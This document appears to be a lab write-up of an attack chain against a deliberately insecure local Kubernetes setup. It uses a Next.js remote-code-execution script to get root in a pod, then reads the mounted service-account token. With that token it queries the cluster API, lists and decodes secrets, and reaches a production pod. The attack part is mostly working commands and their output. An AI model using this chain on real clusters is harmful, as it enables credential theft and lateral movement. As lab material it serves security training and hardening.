# reat2shell: local breach

[Back](../README.md)

- [reat2shell: local breach](#reat2shell-local-breach)
  - [Capture Jewels](#capture-jewels)
    - [Container Secret](#container-secret)
    - [SA token](#sa-token)
    - [Cluster Secret](#cluster-secret)
    - [access prod api](#access-prod-api)
  - [Attack Chain Summary](#attack-chain-summary)

---

## Capture Jewels

- app is accessible at `localhost:8080`

### Container Secret

```sh
# test
python scripts/rce.py http://localhost:8080 id
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# get distro
python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
# executable response:
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"

# get pod tier flag
python scripts/rce.py http://localhost:8080 "printenv CONTAINER_SECRET"
# CoNtAinEr-sEcRet-InsECurE
```

---

### SA token

```sh
# get
python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# executable response:
# total 0
# lrwxrwxrwx 1 root root 13 Oct  6 02:48 ca.crt -> ..data/ca.crt
# lrwxrwxrwx 1 root root 16 Oct  6 02:48 namespace -> ..data/namespace
# lrwxrwxrwx 1 root root 12 Oct  6 02:48 token -> ..data/token

# get ns
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# executable response:
# insecure

# get token
python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6ImF6c0RoVDZOX1JXS0hjXzAtYjBtbndIbHBlT1IwOE9rTzY1VDhkN1hkTWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5l...

# try request api
python scripts/rce.py http://localhost:8080 "curl -sS https://kubernetes.default.svc"
# curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt

# request api
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api"
# executable response:
# {
#   "kind": "APIVersions",
#   "versions": [
#     "v1"
#   ],
#   "serverAddressByClientCIDRs": [
#     {
#       "clientCIDR": "0.0.0.0/0",
#       "serverAddress": "172.19.0.3:6443"
#     }
#   ]
# }

# get pod
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
# list all pods
      # "metadata": {
      #   "name": "react2shell-7cdb9b89b-zmzt9",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "react2shell",
      #   "serviceAccount": "react2shell",
      #   "containers": [
      #     {
      #       "name": "react2shell",
      #       "image": "docker.io/simonangelfong/react2shell:insecure",
```

---

### Cluster Secret

```sh
# list ns
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
      # "metadata": {
      #   "name": "argocd",
      # "metadata": {
      #   "name": "default",
      # "metadata": {
      #   "name": "insecure",
      # "metadata": {
      #   "name": "kube-system",
      # "metadata": {
      #   "name": "prod",

# list secret in pod ns
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
# executable response:
#   "metadata": {
#     "name": "cluster-secret",
#     "namespace": "prod",
#   },
#   "data": {
#     "password": "Y0x1U1Rlci1TZWNSZVQ="
#   },
#   "type": "Opaque"
# }

echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
# cLuSTer-SecReT
```

---

### access prod api

```sh
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/prod/pods"
      # "metadata": {
      #   "name": "backend-api",
      #   "namespace": "prod",
      # "spec": {
      #   "containers": [
      #     {
      #       "name": "nginx",
      #       "image": "nginx:latest",
      #      "ports": [
      #        {
      #          "containerPort": 80,
      #          "protocol": "TCP"
      #  "podIP": "10.244.1.19",

python scripts/rce.py http://localhost:8080 "curl http://10.244.1.19"

```

---

## Attack Chain Summary

| #   | Stage                | Vulnerability             | Exploit                    |
| --- | -------------------- | ------------------------- | -------------------------- |
| 1   | RCE                  | Next.js (CVE-2025-55182)  | root shell in pod          |
| 2   | get Container secret |                           | container secret           |
| 3   | get SA token         | token auto-mounted in pod | access kube api with token |
| 4   | scan secret          | permissive RBAC           | cluster secret             |
| 5   | get prod api         | flat network              | access api in prod ns      |
